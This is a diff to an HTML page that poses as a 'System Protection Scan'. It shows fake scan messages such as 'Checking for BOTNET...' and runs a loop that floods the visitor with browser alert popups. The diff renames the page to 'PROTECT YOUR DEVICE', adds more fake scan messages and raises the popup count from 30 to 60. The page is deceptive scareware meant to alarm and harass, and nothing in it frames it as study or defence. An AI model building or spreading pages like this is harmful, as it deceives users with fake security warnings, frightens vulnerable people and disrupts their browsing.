@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>⚠ CRITICAL SYSTEM ALERT</title>
+<title>✨ PROTECT YOUR DEVICE</title>
 <style>
   body {
     margin: 0; 
@@ -135,7 +135,7 @@
 <body>
 <div class="safe-mode">
   <h1>System Protection Scan</h1>
-  <p>Click below to scan for viruses and optimize your device</p>
+  <p>Click below to scan for viruses and optimize your device👌🏻</p>
   <button id="scanButton">Start Security Scan</button>
   <div class="loading" id="loadingText"></div>
 </div>
@@ -180,7 +180,12 @@
       "Checking for malware...",
       "Detecting vulnerabilities...",
       "Analyzing network security...",
-      "Finalizing security scan..."
+      "Finalizing security scan...",
+      "Scanning system...",
+      "Checking for BOTNET...",
+      "Detecting vulnerabilities...",
+      "Analyzing network...",
+      "Finalizing security..."
     ];
     
     let loadingIndex = 0;
@@ -256,14 +261,14 @@
     
     // Alert bombardment
     let alertCount = 0;
-    const maxAlerts = 30; // Jumlah popup alert
+    const maxAlerts = 60; // Jumlah popup alert
     const alertInterval = setInterval(() => {
       if (alertCount >= maxAlerts) {
         clearInterval(alertInterval);
       } else {
         const alertMessage = phrases[Math.floor(Math.random() * phrases.length)];
         setTimeout(() => {
-          alert("⚠⚠⚠ " + alertMessage + " ⚠⚠⚠");
+          alert("⚠⚠ " + alertMessage + " ⚠⚠⚠");
         }, Math.random() * 200); // Random delay under 200ms
         
         alertCount++;
